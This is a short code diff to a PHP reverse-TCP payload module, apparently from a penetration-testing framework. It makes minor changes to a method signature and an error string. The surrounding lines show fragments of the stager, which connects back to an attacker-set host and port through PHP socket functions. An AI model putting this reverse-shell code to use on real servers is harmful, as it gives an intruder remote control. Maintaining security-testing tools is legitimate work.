@@ -17,7 +17,7 @@ module Payload::Php::ReverseTcp
   #
   # Generate the first stage
   #
-  def generate
+  def generate(_opts = {})
     conf = {
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
@@ -68,7 +68,7 @@ if (!$s && ($f = 'socket_create') && is_callable($f)) {
 	$s_type = 'socket';
 }
 if (!$s_type) {
-	die('no socket funcs');
+	die('no socket func');
 }
 if (!$s) { die('no socket'); }
 ^
